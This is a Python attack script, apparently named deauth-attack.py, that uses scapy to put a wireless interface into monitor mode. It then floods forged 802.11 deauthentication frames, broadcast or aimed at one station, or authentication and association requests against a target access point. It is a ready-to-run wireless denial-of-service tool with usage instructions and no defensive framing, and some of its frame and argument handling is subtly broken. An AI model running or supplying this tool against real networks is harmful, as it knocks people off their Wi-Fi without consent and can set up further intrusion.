import os, sys, time, socket, struct, fcntl, re
from threading import Thread, Lock
from subprocess import Popen, PIPE
from signal import SIGINT, signal
import pcap
from scapy.all import Dot11, RadioTap, sendp, Dot11Deauth, Dot11Auth, Dot11AssoReq

class Flooding:
    def __init__(self, iface=None, apMac=None, stMac=None, auth=None):
        self.monitor_on = False
        self.mon_iface = self.get_mon_iface(iface)
        self.iface = self.mon_iface
        self.apMac = apMac
        self.stMac = stMac
        self.auth = auth
        self.exit = False

    def get_mon_iface(self, iface):
        if iface:
            if self.check_monitor(iface):
                self.monitor_on = True
                return iface

    def check_monitor(self, iface):
        try:
            proc = Popen(['iwconfig', iface], stdout=PIPE, stderr=PIPE)
            data =  proc.communicate()
            if "Mode:Monitor" in data[0].decode():
                return True
            elif "No such device" in data[1].decode():
                print("Interface not found")
                return False
            print("Interface is not in mode monitor")
            self.start_mon_mode(iface)
            return True
        except OSError:
            print('Could not execute "iwconfig"')
            return False

    def start_mon_mode(self, interface):
        print(f'Starting monitor mode off {interface}')
        try:
            os.system('ifconfig %s down' % interface)
            os.system('iwconfig %s mode monitor' % interface)
            os.system('ifconfig %s up' % interface)
            return interface
        except Exception:
            print('Could not start monitor mode')
            self.exit = True

    def deauth_attack(self):
        frame = RadioTap() / Dot11(type=0, subtype=12, addr1="ff:ff:ff:ff:ff:ff", addr2=self.apMac, addr3=self.apMac) / Dot11Deauth(reason=7)
        sendp(frame, iface=self.iface, inter=0.500, loop=1, verbose=True)

    def deauth_unicast_attack(self):
        while True:
            frame = RadioTap() / Dot11(type=0, subtype=12, addr1=self.stMac, addr2=self.apMac, addr3=self.apMac) / Dot11Deauth(reason=7)
            sendp(frame, iface=self.iface, inter=0.500, loop=0, verbose=False)
            frame = RadioTap() / Dot11(type=0, subtype=12, addr1=self.apMac, addr2=self.stMac, addr3=self.apMac) / Dot11Deauth(reason=7)
            sendp(frame, iface=self.iface, inter=0.500, loop=0, verbose=False)

    def auth_attack(self):
        while True:
            frame = RadioTap() / Dot11(type=0, subtype=12, addr1=self.apMac, addr2=self.stMac, addr3=self.apMac) / Dot11Auth()
            sendp(frame, iface=self.iface, inter=0.500, loop=0, verbose=False)
            frame = RadioTap() / Dot11(type=0, subtype=12, addr1=self.apMac, addr2=self.stMac, addr3=self.apMac) / Dot11AssoReq()
            sendp(frame, iface=self.iface, inter=0.500, loop=0, verbose=False)

    def run(self):
        if(self.auth):
            self.auth_attack()
        else:
            if(self.stMac):
                self.deauth_unicast_attack()
            else:
                self.deauth_attack()

if __name__ == "__main__":
    if os.geteuid():
        print("Please run as root")
    else:

        if len(sys.argv) < 3:
            print("Usage: sudo python3 deauth-attack.py <interface> <ap mac> [<station mac> [-auth]]")
            print("Sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB")
            sys.exit()

        iface = sys.argv[1]
        apMac = sys.argv[2]

        try:
            if(sys.argv[3]):
                stMac = sys.argv[3]
        except:
            stMac = None


        try:
            if(sys.argv[4] == '-auth'):
                auth = True
        except:
            auth = False


        if iface != "" :
            sn = Flooding(iface=iface,apMac=apMac,stMac=stMac,auth=auth)
            sn.run()
